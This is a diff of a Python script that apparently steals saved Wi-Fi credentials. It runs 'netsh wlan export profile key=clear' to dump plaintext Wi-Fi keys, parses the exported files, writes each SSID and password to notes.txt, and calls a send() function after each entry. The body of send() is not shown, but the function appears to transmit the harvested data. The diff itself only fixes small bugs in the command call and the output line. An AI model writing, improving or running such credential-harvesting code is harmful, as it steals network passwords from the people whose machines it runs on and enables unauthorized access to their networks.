@@ -14,7 +14,8 @@ wifi_files = []
 wifi_name = []
 wifi_password = []
 
-command = subprocess.run(["netsh", "wlan", "export", "profiles", "key=clear"], capture_output = True).stdout.decode()
+subprocess.run("netsh wlan export profile key=clear", capture_output = True).stdout.decode()
+#os.system("netsh wlan export profile key=clear")
 
 path = os.getcwd()
 
@@ -56,8 +57,8 @@ for file_name in os.listdir(path):
                         wifi_password.append(back)
                         for x, y in zip(wifi_name, wifi_password):
                             sys.stdout = open("notes.txt", "a", encoding="utf-8")
-                            sys.stdout.write(f"SSID: {x} Password: {y}", sep = "\n")
-                            #print(f"SSID: {x} Password: {y}", sep = "\n")
+                            #sys.stdout.write(f"SSID: {x} Password: {y}", sep = "\n")
+                            print(f"SSID: {x} Password: {y}", sep = "\n")
                             sys.stdout.close()
                             send()
                             
